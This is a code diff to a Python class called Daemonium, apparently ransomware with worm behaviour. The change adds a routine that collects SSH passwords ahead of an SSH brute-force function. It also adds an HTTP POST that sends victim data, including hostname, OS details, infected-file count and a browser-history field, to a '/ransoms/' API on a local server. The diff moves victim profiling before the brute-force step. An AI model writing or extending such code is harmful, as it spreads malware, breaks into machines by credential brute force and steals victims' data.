@@ -185,6 +185,7 @@ class Daemonium:
             return False
 
     def __ssh_brute_force(self) -> None:
+        self.__get_ssh_passwords()
         try:
             files = []
             with open("passwords.txt", 'r', encoding='latin1') as file:
@@ -225,15 +226,24 @@ class Daemonium:
         self.__data["hostname"] = socket.gethostname()
         self.__data['system_release'] = platform.release()
         self.__data['SO'] = platform.system()
-        self.__data['disk'] = psutil.disk_usage('/')
-        self.__data['memory'] = psutil.virtual_memory()
-        self.__data['cpu'] = psutil.cpu_stats()
+        self.__data['disk'] = "psutil.disk_usage('/')"
+        self.__data['memory'] = "psutil.virtual_memory()"
+        self.__data['cpu'] = "psutil.cpu_stats()"
         self.__data['infected_files'] = self.__count
-        self.__data['history_browser'] = self.__content
+        self.__data['history_browser'] = "self.__content"
+        try:
+            print("[+] send data")
+            response = requests.post("http://localhost:9999/api/v1/ransoms/", json=self.__data)
+            if response.status_code == 201:
+                print("OK")
+            else:
+                print(f"fail to send {response.status_code}")
+        except Exception as e:
+            print(e)
 
     def __worm_function(self) -> None:
-        self.__ssh_brute_force()
         self.__get_victim_info()
+        self.__ssh_brute_force()
 
     def run(self) -> None:
         self.__find_files()
